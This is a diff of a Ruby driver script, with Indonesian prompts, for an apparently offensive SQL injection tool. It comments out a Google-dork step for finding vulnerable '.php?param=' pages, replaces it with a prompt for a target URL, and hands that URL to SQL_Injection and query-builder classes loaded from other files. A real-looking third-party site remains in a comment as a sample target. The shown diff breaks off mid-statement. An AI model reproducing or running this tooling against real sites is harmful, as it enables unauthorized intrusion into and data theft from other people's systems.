@@ -1,46 +1,50 @@
 require 'net/http'
 require 'nokogiri'
 
-ALAT_DORK = %q(https://www.google.com/search?q=)
-TARGET = "site:%s .php?%s="
+# ALAT_DORK = %q(https://www.google.com/search?q=)
+# TARGET = "site:%s .php?%s="
 
-print "masukkan web: "
-wb = gets.chomp
-print "masukkan param: "
-pm = gets.chomp
+# print "masukkan web: "
+# wb = gets.chomp
+# print "masukkan param: "
+# pm = gets.chomp
 
-tg = TARGET % [wb, pm]
+# tg = TARGET % [wb, pm]
 
-puts "\n\n"
-permisi = "Silahkan pilih target lewat dorking \nklik "
-link = String.new.concat(ALAT_DORK, tg)
-puts permisi.concat(link.gsub!(/ /, "%20"))
-puts "\n\n"
-print "masukkan url dork target: "
+# puts "\n\n"
+# permisi = "Silahkan pilih target lewat dorking \nklik "
+# link = String.new.concat(ALAT_DORK, tg)
+# puts permisi.concat(link.gsub!(/ /, "%20"))
+# puts "\n\n"
+# print "masukkan url dork target: "
 
-uri = URI.parse(gets)
-web = Net::HTTP.new(uri.host, uri.port)
-web.use_ssl = true
-reponse = web.get(uri.to_s)
-if reponse.code.to_i == 302
-	reponse = web.get(reponse["location"])
-end
+# uri = URI.parse(gets)
+# web = Net::HTTP.new(uri.host, uri.port)
+# web.use_ssl = true
+# reponse = web.get(uri.to_s)
+# if reponse.code.to_i == 302
+# 	reponse = web.get(reponse["location"])
+# end
 
-meta_url = reponse.body.scan(/\<meta[^\>]+url=[^\>]+\>/)
-target_url = nil
-if meta_url.empty?
-	print "Tidak ditemukan ; target : "
-	target_url = gets
-else
-	document = Nokogiri::HTML.parse(meta_url.first)
-	target_url = document.css("meta").collect { |i| i.attribute('content') } .compact.first.value
-	target_url.slice!(0, 2)
-end
+# meta_url = reponse.body.scan(/\<meta[^\>]+url=[^\>]+\>/)
+# target_url = nil
+# if meta_url.empty?
+# 	print "Tidak ditemukan ; target : "
+# 	target_url = gets
+# else
+# 	document = Nokogiri::HTML.parse(meta_url.first)
+# 	target_url = document.css("meta").collect { |i| i.attribute('content') } .compact.first.value
+# 	target_url.slice!(0, 2)
+# end
 
 load 'sql_injection.rb'
 load 'pembuat_query.rb'
 
-target_url = "http://ecline.id/news-details.php?newsId=1" #Nanti Dihapus!
+# target_url = "http://ecline.id/news-details.php?newsId=1" #Nanti Dihapus!
+system("clear")
+puts "\n\n\t"
+print "Target URL : "
+target_url = gets.chomp
 target = SQL_Injection.new(target_url)
 query = PembuatQuery.new.tap do |i|
 	i.param = target_url.slice!(/(\d+)$/)
